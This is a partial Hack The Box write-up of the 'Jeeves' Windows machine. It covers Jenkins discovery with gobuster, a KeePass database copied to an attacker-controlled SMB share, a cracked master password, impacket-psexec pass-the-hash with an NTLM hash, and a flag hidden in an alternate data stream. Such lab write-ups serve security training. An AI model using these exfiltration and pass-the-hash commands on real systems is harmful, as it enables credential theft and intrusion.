...
tags: [htb, jenkins, jetty, gobuster, psexec, windows, keepass, keepass2john, alternative-data-streams, pass-the-hash]
...
![](/assets/img/jeeves/Pasted_image_20260908012720.png)
...
### Port 50000 - Jetty Web Server and Jenkins Discovery

Directory brute-forcing using GoBuster against port 50000:

```bash
gobuster dir -u http://<target>:50000/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
```
...
![](/assets/img/jeeves/Pasted_image_20260908020221.png)
...
![](/assets/img/jeeves/Pasted_image_20260908020511.png)
...
### KeePass Database Discovery and Exploitation
...
#### Step 1: Exfiltrate KeePass Database
...
```powershell
net use Z: \\<attacker_ip>\share /user:kali kali
copy C:\Users\kohsuke\Documents\CEH.kdbx \\<attacker_ip>\share\
...
#### Step 2: Crack KeePass Master Password
...
![](/assets/img/jeeves/Pasted_image_20260908021042.png)

**Result:** The KeePass master password is cracked to **moonshine1**

#### Step 3: Extract Credentials from KeePass
...
![](/assets/img/jeeves/Pasted_image_20260908021112.png)
...
```bash
impacket-psexec -hashes :e0fb1fb85756c24235ff238cbe81fe00 Administrator@<target> cmd.exe
```

![](/assets/img/jeeves/Pasted_image_20260908021622.png)
...
Navigate to the Administrator Desktop to locate the root flag:
...
![](/assets/img/jeeves/Pasted_image_20260908021806.png)

The root flag file is visible in the directory listing. Use the `/R` parameter to enumerate and read Alternate Data Streams (ADS) on the Desktop, as the actual flag may be hidden in an ADS:

#### Step 6: Extract Alternate Data Stream Flag
...
![](/assets/img/jeeves/Pasted_image_20260908021829.png)

The root flag is successfully retrieved from the Alternate Data Stream, completing the compromise of the target system.
...
2. **Enumeration:** Directory brute-forcing discovered Jenkins running on port 50000
